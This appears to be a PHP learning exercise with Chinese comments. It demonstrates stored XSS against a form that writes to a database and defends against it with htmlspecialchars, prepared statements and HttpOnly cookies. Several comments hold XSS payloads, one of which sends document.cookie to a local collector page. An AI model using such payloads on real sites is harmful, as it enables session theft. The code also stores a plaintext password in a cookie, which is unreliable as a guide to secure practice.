<?php
//xss：输入一些script代码， 将其存放在数据库中，等有人用时，再将其调出，作用在受害者身上

//偷取cookie
setcookie("username", "leoli", strtotime("+2 days"));
setcookie("password", "12345", strtotime("+2 days"));

//防御cookie盗取
setcookie("username", "leoli", strtotime("+2 days"), "/", "", "", true); //前三个必填，后四个防止偷cookie：“/”：限制路径， true：http-only
setcookie("password", "12345", strtotime("+2 days"), "/", "", "", true);

//在message中输入 <script>window.location="http://localhost/study/xss/cookie.php?cookie="+encodeURI(document.cookie)</script>


if(isset($_POST['submit'])){
    $name = htmlspecialchars($_POST['name']);          //对html的特别标签进行转译，浏览器再不在识别如<script><script>标签
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $message = htmlspecialchars($_POST['message']);

    $mysqli = new mysqli("localhost", "root", "", "my_database");

    if($mysqli->connect_errno){
        die($mysqli->connect_error);
    }else{
        echo $name . $email . $password . $message;
        $pre_statement = $mysqli->prepare("insert into users (`name`, `email`, `password`, `message`) values(?, ?, ?, ?)");
        $pre_statement->bind_param("ssss", $name, $email, $password, $message); //有多少个要插入的数据就要有多少个‘s’

        //xss攻击：
        //在message里写入： 
        //<script>alert(2333)</script>
        //<script>window.location="http://www.google.ca"</script>

        if($pre_statement->execute()){
            echo "success";
        }else{
            echo "fail";
        }
    }
}


?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <form action="<?php echo $_SERVER['PHP_SELF']?>" method="post">
        <div>
            <label for="name">Name:</label>
            <input type="text" id="name" name ="name">
        </div>
        <div>
            <label for="email">Email:</label>
            <input type="text" id="email" name="email">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="text" id="password" name="password">
        </div>
        <div>
            <label for="message">Message:</label>
            <input name="message" id="message"></input>
        </div>
        <input type="submit" value="Submit" name = "submit"> 
    </form>
    <div>
        <table>
        <thead>
            <th>name</th>
            <th>email</th>
            <th>password</th>
            <th>message</th>
        </thead>
        <tbody>
        <?php
            if($mysqli->connect_errno){
                die($mysqli->connect_error);
            }else{
                echo $name . $email . $password . $message;
                $pre_statement = $mysqli->prepare("select * from users;");
                if($pre_statement->execute()){
                    $result = $pre_statement->get_result();
                    if($result->num_rows){
                        while($row = $result->fetch_assoc()){
                            echo "<tr>".
                                    "<td>".$row['name']. "</td>".
                                    "<td>".$row['email']. "</td>".
                                    "<td>".$row['password']. "</td>".
                                    "<td>".$row['message']. "</td>".
                                "</tr>";
                        }
                    }
                }else{
                    echo "fail sql";
                }
            }
        ?>
        </tbody>
        </table>
    </div>
</body>
</html>

